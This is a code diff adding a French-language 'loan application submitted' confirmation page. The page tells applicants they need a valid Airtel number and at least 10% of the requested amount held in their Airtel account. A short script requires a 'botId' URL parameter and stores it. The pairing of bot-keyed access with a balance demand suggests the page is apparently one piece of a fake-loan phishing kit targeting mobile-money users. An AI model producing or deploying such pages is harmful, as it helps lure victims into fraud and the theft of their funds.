@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Succès</title>
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: linear-gradient(135deg, #6dd5ed, #2193b0);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    padding: 20px;
+    color: #333;
+}
+
+.success-container {
+    background: #fff;
+    padding: 30px 25px;
+    border-radius: 15px;
+    width: 100%;
+    max-width: 450px;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.15);
+    text-align: center;
+    animation: fadeIn 0.8s ease-in-out;
+}
+
+h2 {
+    font-size: 24px;
+    margin-bottom: 15px;
+    color: #2b7a78;
+}
+
+p {
+    color: #555;
+    font-size: 16px;
+    line-height: 1.6;
+    margin-bottom: 25px;
+}
+
+.loan-notice {
+    background: #f0f9ff;
+    border-left: 5px solid #2193b0;
+    padding: 15px 20px;
+    border-radius: 10px;
+    text-align: left;
+    font-size: 15px;
+    line-height: 1.5;
+    color: #333;
+}
+
+.loan-notice strong {
+    display: block;
+    margin-bottom: 10px;
+    color: #0b3d91;
+    font-size: 16px;
+}
+
+.loan-notice ol {
+    padding-left: 20px;
+}
+
+.loan-notice li {
+    margin-bottom: 8px;
+}
+
+@keyframes fadeIn {
+    0% { opacity: 0; transform: translateY(-20px);}
+    100% { opacity: 1; transform: translateY(0);}
+}
+
+@media (max-width: 480px) {
+    .success-container {
+        padding: 25px 15px;
+    }
+
+    h2 {
+        font-size: 20px;
+    }
+
+    p {
+        font-size: 14px;
+    }
+
+    .loan-notice {
+        font-size: 14px;
+    }
+}
+</style>
+</head>
+<body>
+
+<div class="success-container">
+    <h2>Demande de prêt soumise avec succès !</h2>
+    <p>
+        Votre demande a été soumise avec succès. Elle est actuellement en cours d'examen par notre équipe.
+        Vous recevrez un message de notre part une fois l'examen terminé.
+        Les candidats doivent satisfaire aux exigences spécifiées pour que la demande soit traitée.
+    </p>
+
+    <div class="loan-notice">
+        <strong>Avis d'éligibilité :</strong>
+        <ol>
+            <li>Vous devez postuler en utilisant un numéro Airtel valide.</li>
+            <li>Vous devez avoir au moins 10 % du montant demandé sur votre compte Airtel.</li>
+        </ol>
+    </div>
+</div>
+
+<script>
+let botId = new URLSearchParams(window.location.search).get('botId');
+if (!botId) { alert("Lien d'accès invalide"); throw new Error("botId missing"); }
+localStorage.setItem('botId', botId);
+</script>
+
+</body>
+</html>
